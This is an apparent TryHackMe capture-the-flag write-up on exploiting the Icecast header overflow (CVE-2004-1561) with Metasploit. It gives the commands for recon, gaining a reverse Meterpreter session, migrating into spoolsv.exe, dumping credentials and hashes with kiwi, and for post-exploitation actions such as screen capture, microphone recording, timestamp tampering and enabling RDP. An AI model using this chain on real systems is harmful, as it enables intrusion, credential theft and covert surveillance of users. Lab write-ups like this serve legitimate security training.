# Icecast Exploit
> Author: daniboomberger
> Date: 16.10.2020

## Recon
> **Scan the machine**
> - `nmap -sC -sV -Pn <IP_ADDRESS>`
> - This will return our open ports and Versions of the server. `-Pn` this just look at every host as if it where online
> `sudo nmap -sS -Pn <IP_ADDRESS>`
> - I ran this SYN scan just it was recommended by the box
>
> **What is the Microsoft Remote Desktop Port?**
> - As we ran the command before I just analyzed the data. And there was a MSRDP port `3389`
>
>**What Service did run on port 8000?**
> - It is the `Icecast` Service running on port `8000`
>
>**What does Nmap identify as hostname?**
> - The hostname is `DARK-PC`

## Gain Access
> **What type of Vulnerability is Icecast?**
> - Thanks to https://www.cvedetails.com it was easy. `Execute Code Overflow`
>
> **What is the CVE number for the Vulnerability?**
> - `CVE-2004-1561` (CVE-YEAR-NUMBER)
>
> **Path of exploit in Metasploit?**
> - `search icecast`
> - To find the exploit in Metasploit
> - `exploit/windows/http/icecast_header`
>
> **Configure and Exploit**
> - `show options`
> - This will give us the information for the confiugration
> - set RHOSTS <IP_ADDRESS>
> - set LHOST <IP_ADDRESS> <-- The IP for LHOST is the tun0 IP, It is your internal IP for tryhackme
> - `run` or `exploit`

## Looting
> **How to get running process of the machine?**
> - `ps`
> - Command to show running process
> - We needed to search for the printer process ran by `NT AUTHORITY\SYSTEM`
> - `spoolsv.exe` was the process to find
>
> **Migrate process**
> - `migrate -N <PROCESS_NAME>`
> - Migrate our process <PROCESS_NAME> would be `spoolsv.exe`
>
> **How to load mimkatz?**
> - `load kiwi`
> - Why kiwi instead of mimkatz? because kiwi is the updated version of mimkatz
> 
> **Get credentials with kiwi**
> - `creds_all`
> - Will display the password for the DARK user `Password01`

## Post-Exploitation
> **Get stored password hashes**
> - `hashdump`
>
> **Watch remotes user's desktop**
> - `screenshare`
>
> **How to record the mic?**
> - `record_mic`
> 
> ** How to change timestamp of file?**
> - `timestomp`
> - Never do this in a actual penetration test
>
> **How to enable MSRDP?**
> - `run post/windows/manage/enable_rdp`

## Conclusion
> I have to say it's pretty similar to Eternal Blue, nothing much. Just do this Room some days later, so you can repeat the stuff you learned in the Eternal Blue Room. But it was a good repetition to learn Metasploit, nmap and meterpreter
